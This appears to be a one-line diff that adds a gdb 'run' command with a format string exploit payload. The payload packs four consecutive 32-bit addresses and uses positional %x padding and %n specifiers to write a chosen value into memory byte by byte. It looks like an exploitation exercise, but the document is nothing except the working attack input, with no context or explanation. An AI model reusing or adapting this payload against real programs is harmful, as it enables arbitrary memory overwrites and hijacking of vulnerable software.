@@ -1,0 +1,1 @@
+run $(python -c 'print "\xfc\x96\x04\x08\xfd\x96\x04\x08\xfe\x96\x04\x08\xff\x96\x04\x08"')%9\$206x%9\$n%9\$226x%10\$n%9\$237x%11\$n%9\$49x%12\$n
